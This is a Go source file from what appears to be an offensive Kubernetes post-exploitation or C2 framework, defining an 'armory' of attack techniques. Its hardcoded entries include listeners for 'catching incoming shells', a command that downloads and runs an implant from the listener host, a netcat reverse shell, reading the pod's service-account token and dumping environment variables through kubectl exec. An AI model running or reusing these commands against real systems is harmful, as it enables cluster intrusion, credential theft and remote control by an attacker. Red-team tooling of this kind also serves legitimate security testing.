package armory

import (
	"errors"
	"fmt"
	"io/fs"
	"path/filepath"
	"strings"

	"github.com/Magier/Ran/domain"
)

// type ResultHandler = func(source domain.Entity, args ...any) (domain.Event, error)

// type TTPMeta struct {
// 	Title, Description string
// 	ResultHandler      ResultHandler
// }

// func (meta TTPMeta) GetTitle() string {
// 	return meta.Title
// }
// func (meta TTPMeta) GetDescription() string {
// 	return meta.Description
// }

// func (meta TTPMeta) HandleResult(source domain.Entity, args ...any) (domain.Event, error) {
// 	if meta.ResultHandler == nil {
// 		return nil, nil
// 	}
// 	return meta.ResultHandler(source, args...)
// }

// type CreateListener struct {
// 	TTPMeta
// 	Port uint
// }

// func (c CreateListener) GetMessage() domain.Message {
// 	return domain.StartListener{Port: c.Port}
// }

// type CreateRedirector struct {
// 	TTPMeta
// 	DstPort uint
// }

// func (c CreateRedirector) GetMessage() domain.Message {
// 	return
// }

type EstablishReverseShell struct {
}

// type ReadEnvVars struct {
// 	TTPMeta
// 	TargetId        string
// 	Target          string
// 	TargetNamespace string
// }

// func (c ReadEnvVars) GetMessage() domain.Message {
// 	return domain.ReadEnvVars{
// 		Target: &domain.Target{
// 			Id:   c.TargetId,
// 			Name: c.Target,
// 			Ns:   c.TargetNamespace,
// 		},
// 	}
// }

type KubectlExecCmd struct {
	Cmd string
}

// func (c KubectlExecCmd) GetMessage() domain.Message {
// 	return &domain.ExecTTP{TTP: c, Cmd: c.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
// }

type Armory struct {
	ttps []domain.TTP
}

func LoadArmory(dir string) (Armory, error) {
	ttps := make([]domain.TTP, 0)

	err := filepath.WalkDir(dir, func(w string, d fs.DirEntry, err error) error {
		if d.IsDir() {
			// skip subfolder with all unsupported check details
			// if d.Name() == SkipDir { }
			return err
		}

		if strings.HasSuffix(w, ".md") {
			// parse the TTP
			// parse the preconditions and effect
			// invoke builder to get the currect sub-type of the TTP (based on the kind?)

		}

		return nil
	})
	if err != nil {
		fmt.Println("Couldn't load armory: ", err.Error())
	}

	ttps = []domain.TTP{
		{
			Name:        "Create Listener",
			Description: "Catch incoming shells",
			Command:     domain.StartListener{Port: 1337, Protocol: domain.TCP},
			// Port:        1337,
		},
		{
			Name:        "Create Sliver HTTP Listener",
			Description: "Catch incoming shells",
			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP, Server: "sliver"},
			// Port:        1337,
		},
		{
			Name:        "Create Redirector",
			Description: "Create a proxy routing traffic to the C2",
			Command:     domain.StartC2Redirector{DstPort: 1337},
		},
		{
			Name:        "Drop & Exec Implant",
			Description: "Command to download a prepared C2 implant and execute it to establish a session",
			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
			Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
			CommandFn: func(t domain.TTP) domain.Message {
				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: domain.Target{}} //, C2Channel: KubectlExecCmd{}}
			},
			Requires: domain.Requirements{AccessLevel: domain.UserExec},
		},
		{
			Name:        "Read SerivceAccount Token",
			Description: "Command to download a prepared C2 implant and execute it to establish a session",
			Cmd:         "get_file",
			CommandFn: func(t domain.TTP) domain.Message {
				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Args: []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"}, Target: domain.Target{}}
			},
			Requires: domain.Requirements{AccessLevel: domain.UserRead},
			Effects:  []string{"Pod name", "ServiceAccount name", "Namespace name"},
		},

		{
			Name:     "Check Token permissions",
			Requires: domain.Requirements{Kind: "ServiceAccount"},
		},
		{
			Name:        "Kubectl Exec simple shell",
			Description: "Use kubectl exec to establish a simple shell",
			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
			CommandFn: func(t domain.TTP) domain.Message {
				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: domain.Target{}} //, C2Channel: KubectlExecCmd{}}
			},
		},
		// ExecSimpleReverseShell{
		// 	TTPMeta: TTPMeta{
		// 		Title:       "Start simple reverse shell",
		// 		Description: "Establish",
		// 	},
		// Cmd: "nc $LISTENER $LISTENER_PORT -e /bin/bash",
		// },
		{
			Name:          "Read Environment Variables",
			Description:   "Read environment variables from a target",
			ResultHandler: handleEnvVarResult,
			CommandFn: func(t domain.TTP) domain.Message {
				return domain.ReadEnvVars{
					Target: domain.Target{
						Id:   t.TargetId,
						Name: t.Target,
						Ns:   t.TargetNamespace,
					},
				}
			},
		},
		{
			Name:          "Kubectl Exec Env",
			Description:   "Use kubectl exec to read environment variables of a pod",
			ResultHandler: handleEnvVarResult,
			Cmd:           "env",
			CommandFn: func(t domain.TTP) domain.Message {
				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: domain.Target{}} //, C2Channel: KubectlExecCmd{}}
			},
		},
	}

	return Armory{
		ttps: ttps,
	}, nil
}

func (a Armory) GetTTPs() []domain.TTP {
	return a.ttps
}

func handleEnvVarResult(source domain.Entity, args ...any) (domain.Event, error) {
	stderr := args[1].(string)
	if stderr != "" {
		return nil, errors.New(stderr)
	}

	stdout := args[0].(string)
	vars := make(map[string]string)
	for _, l := range strings.Split(stdout, "\n") {
		k, v, ok := strings.Cut(l, "=")
		if ok {
			vars[k] = v
		}
	}

	return domain.EnvVarsExtracted{
		Source: source,
		Vars:   vars,
	}, nil
}
